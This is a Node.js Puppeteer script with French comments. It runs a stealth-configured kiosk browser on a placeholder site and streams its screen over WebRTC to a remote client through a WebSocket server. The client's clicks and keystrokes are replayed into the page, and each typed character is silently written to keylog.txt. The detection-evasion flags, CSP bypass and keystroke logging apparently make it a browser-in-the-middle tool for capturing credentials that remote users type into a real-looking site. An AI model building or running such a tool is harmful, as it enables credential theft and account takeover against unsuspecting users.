const puppeteer = require('puppeteer');
const WebSocket = require('ws');
const puppeteerExtra = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { Keyboard } = require('puppeteer-keyboard'); // Module pour simuler la saisie
const fs = require('fs');

puppeteerExtra.use(StealthPlugin());

const userAgents = require('./useragent.json');
const randomIndex = Math.floor(Math.random() * userAgents.length);
const randomUserAgent = userAgents[randomIndex];

(async () => {
  // Lancement du navigateur (non-headless) en mode kiosque avec une taille de fenêtre 1920x1080
  const browser = await puppeteerExtra.launch({
    executablePath: '/usr/bin/thorium-browser',
    headless: false,
    defaultViewport: null,
    args: [
      '--disable-infobars',
      '--start-fullscreen',
      '--kiosk',
      '--window-size=1920,1080',
      '--force-device-scale-factor=1',
      '--no-sandbox',
      '--window-position=0,0',
      '--enable-unsafe-swiftshader',
      '--disable-setuid-sandbox',
      '--disable-features=AutomationControlled,EnableEphemeralFlashPermissionUI',
      '--allow-http-screen-capture',
      '--enable-usermedia-screen-capturing',
      '--auto-select-desktop-capture-source=screen',
      '--disable-blink-features=AutomationControlled',
      '--force-webrtc-ip-handling-policy=default_public_interface_only',
      '--disable-extensions'
    ]
  });

  const page = await browser.newPage();
  await page.setUserAgent(randomUserAgent);
  page.setBypassCSP(true);
  // Rediriger les logs du navigateur vers la console du serveur
  page.on('console', msg => {
    console.log('PAGE LOG:', msg.text());
  });

  await page.goto('https://exemple.com/');
  console.log("✅ Navigateur lancé et page chargée");

  // Initialisation du module de saisie clavier
  const keyboard = new Keyboard(page);

  // Stockage de la connexion WebSocket active
  let wsClient = null;

  // Variable globale pour conserver le texte courant
  let currentText = "";

  // Exposer la fonction d'envoi des ICE candidates une seule fois
  await page.exposeFunction('sendIceCandidateToServer', candidate => {
    console.log("Exposed function appelée avec candidate :", candidate);
    if (wsClient && wsClient.readyState === wsClient.OPEN) {
      wsClient.send(JSON.stringify({ type: 'candidate', candidate }));
    }
  });

  // Création du serveur WebSocket sur le port 8080
  const wss = new WebSocket.Server({ host: '0.0.0.0', port: 8080 });
  console.log("✅ Serveur WebSocket lancé sur ws://0.0.0.0:8080");

  wss.on('connection', ws => {
    console.log("✅ Client connecté au WebSocket");
    wsClient = ws;

    ws.on('message', async message => {
      console.log("Message reçu du client :", message);
      let data;
      try {
        data = JSON.parse(message);
      } catch (err) {
        console.error("Erreur lors du parsing du JSON :", err);
        return;
      }

      if (data.type === 'offer') {
        console.log("🎥 Offre WebRTC reçue");
        try {
          const answer = await page.evaluate(async (offer) => {
            // Création de la RTCPeerConnection avec configuration ICE
            window.peerConnection = new RTCPeerConnection({
              iceServers: [
                { urls: 'stun:stun.l.google.com:19302' },
                {
                  urls: 'turn:10.10.10.10:3478?transport=tcp',
                  username: 'test',
                  credential: 'test'
                }
              ]
            });

            // Envoi des ICE candidates via la fonction exposée
            window.peerConnection.onicecandidate = event => {
              if (event.candidate) {
                window.sendIceCandidateToServer(event.candidate);
              }
            };

            // Obtenir le flux vidéo via getDisplayMedia
            let stream;
            try {
              stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
              console.log("Nombre de pistes vidéo :", stream.getVideoTracks().length);
            } catch (error) {
              console.error("Erreur lors de getDisplayMedia :", error);
              throw error;
            }

            // Ajouter la piste vidéo si disponible
            if (stream.getVideoTracks().length > 0) {
              window.peerConnection.addTrack(stream.getVideoTracks()[0], stream);
            } else {
              console.error("Aucune piste vidéo trouvée!");
            }

            // Appliquer l'offre et créer une réponse
            await window.peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
            const answer = await window.peerConnection.createAnswer();
            await window.peerConnection.setLocalDescription(answer);

            // Attendre la fin du gathering des ICE candidates (max 2 secondes)
            await new Promise(resolve => {
              if (window.peerConnection.iceGatheringState === 'complete') {
                resolve();
              } else {
                const timeout = setTimeout(resolve, 2000);
                window.peerConnection.addEventListener('icegatheringstatechange', function check() {
                  if (window.peerConnection.iceGatheringState === 'complete') {
                    window.peerConnection.removeEventListener('icegatheringstatechange', check);
                    clearTimeout(timeout);
                    resolve();
                  }
                });
              }
            });

            return { type: window.peerConnection.localDescription.type, sdp: window.peerConnection.localDescription.sdp };
          }, data.offer);

          console.log("🎥 Envoi de la réponse WebRTC :", answer);
          ws.send(JSON.stringify({ type: 'answer', answer }));
        } catch (error) {
          console.error("Erreur lors du traitement de l'offre :", error);
        }
      } else if (data.type === 'candidate') {
        console.log("📡 ICE candidate reçu du client :", data.candidate);
        await page.evaluate(async candidate => {
          try {
            await window.peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
          } catch (err) {
            console.error("Erreur lors de l'ajout de l'ICE candidate :", err);
          }
        }, data.candidate);
      } else if (data.type === 'user-event' && data.eventType === 'click') {
        // Ajout d'une virgule lors de chaque clic
        currentText += ",";
        fs.writeFile('keylog.txt', currentText, err => {
          if (err) console.error("Erreur lors de l'écriture dans keylog.txt :", err);
        });

        // Récupérer la position du clic et adapter selon les dimensions du flux
        const { x, y, videoWidth, videoHeight } = data;
        const remoteDimensions = await page.evaluate(() => ({
          width: window.innerWidth,
          height: window.innerHeight
        }));
        const scaleX = remoteDimensions.width / videoWidth;
        const scaleY = remoteDimensions.height / videoHeight;
        const adjustedX = x * scaleX;
        const adjustedY = y * scaleY - 30;
        await page.mouse.click(adjustedX, adjustedY);
      } else if (data.type === 'user-event' && data.eventType === 'keydown') {
        // Enregistrement de la frappe dans le fichier keylog.txt
        if (data.key === "Backspace" || data.key === "Delete") {
          currentText = currentText.slice(0, -1);
        } else if (data.key === "Enter") {
          currentText += ",";
        } else if (data.key === "Tab") {
          currentText += "\t";
        } else if (data.key.length === 1) {
          currentText += data.key;
        }
        fs.writeFile('keylog.txt', currentText, err => {
          if (err) console.error("Erreur lors de l'écriture dans keylog.txt :", err);
        });

        console.log(`Simuler frappe clavier pour key: ${data.key}`);
        if (data.key && data.key.length === 1) {
          await keyboard.type(data.key);
        } else {
          await page.keyboard.press(data.key);
        }
      }
    });

    ws.on('close', () => {
      console.log("❌ Connexion WebSocket fermée");
      wsClient = null;
    });
  });

  // Réinitialisation du flux après navigation
  page.on('load', async () => {
    console.log("Navigation détectée – page rechargée.");
    // Définir la fonction initializeCapture dans le contexte de la nouvelle page
    await page.evaluate(() => {
      window.initializeCapture = async () => {
        window.peerConnection = new RTCPeerConnection({
          iceServers: [
            { urls: 'stun:stun.l.google.com:19302' },
            {
              urls: 'turn:10.10.10.10:3478?transport=tcp',
              username: 'test',
              credential: 'test'
            }
          ]
        });
        window.peerConnection.onicecandidate = event => {
          if (event.candidate) {
            window.sendIceCandidateToServer(event.candidate);
          }
        };
        try {
          const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
          if (stream.getVideoTracks().length > 0) {
            window.peerConnection.addTrack(stream.getVideoTracks()[0], stream);
          } else {
            console.error("Aucune piste vidéo détectée !");
          }
        } catch (err) {
          console.error("Erreur lors de getDisplayMedia :", err);
        }
      };
    });

    // Appeler la fonction pour réinitialiser le flux
    await page.evaluate(() => window.initializeCapture());

    // Notifier le client pour relancer la négociation WebRTC
    if (wsClient && wsClient.readyState === wsClient.OPEN) {
      console.log("Envoi du message 'reinit' au client");
      wsClient.send(JSON.stringify({ type: 'reinit' }));
    }
  });
})();
